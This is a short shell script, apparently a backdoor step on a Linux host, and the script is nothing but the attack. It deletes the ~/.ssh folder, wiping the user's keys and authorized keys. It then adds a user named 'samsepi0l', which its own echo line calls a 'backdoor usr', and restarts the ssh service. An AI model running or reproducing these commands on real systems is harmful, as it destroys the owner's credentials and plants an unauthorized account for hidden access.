echo "removing ssh config folder..."
rm -r ~/.ssh
echo "creating backdoor usr..."
useradd -M samsepi0l
echo "restarting ssh service..."
systemctl restart ssh
echo "HOPEFULLY COMPLETE"
